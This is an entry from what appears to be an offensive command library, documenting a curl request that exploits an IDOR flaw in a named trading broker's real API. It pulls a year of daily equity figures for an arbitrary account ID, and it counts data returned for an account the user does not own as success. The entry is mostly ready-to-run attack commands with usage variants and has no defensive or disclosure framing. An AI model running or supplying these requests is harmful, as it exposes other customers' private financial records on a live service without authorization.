---
id: cmd-equity-stats-001
data: >-
  curl -X GET
  "https://api.exness.com/v3/personal_area/stats/equity?time_range=365&accounts=xxx"
  -H "Authorization: Bearer {token}" -H "Content-Type: application/json"
tags:
  - idor
  - api
  - exness
type: command
output: JSON response containing equity data for the specified account
executor: bash
platforms:
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:32:39.151Z'
verified: false
validated: true
submitted: true
---
# query-exness-equity-stats

## Command

```bash
curl -X GET "https://api.exness.com/v3/personal_area/stats/equity?time_range=365&accounts=xxx" -H "Authorization: Bearer {token}" -H "Content-Type: application/json"
```

## Description

Retrieves daily equity figures for a target MT account via the Exness API, exploiting IDOR by using an arbitrary account ID.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| accounts | Target MT account ID (e.g., xxx for unauthorized) | Yes |
| time_range | Period in days (365 for yearly) | Yes |
| Authorization | Bearer token | Yes |

## Examples

### Basic Usage

```bash
curl -X GET "https://api.exness.com/v3/personal_area/stats/equity?time_range=365&accounts=xxx" -H "Authorization: Bearer eyJ..."
```

### Advanced Usage

```bash
curl -X GET "https://api.exness.com/v3/personal_area/stats/equity?time_range=365&accounts=xxx" -H "Authorization: Bearer {token}" -o equity.json
```

## Expected Output

JSON with equity array, e.g., {"data": [{"date": "2023-01-01", "value": 15000.00}]}. Indicates success if data for non-owned account.

## Related

- [[commands/query-exness-net-profit-stats]]
- [[procedures/Exploit-IDOR-in-Exness-Stats-API]]
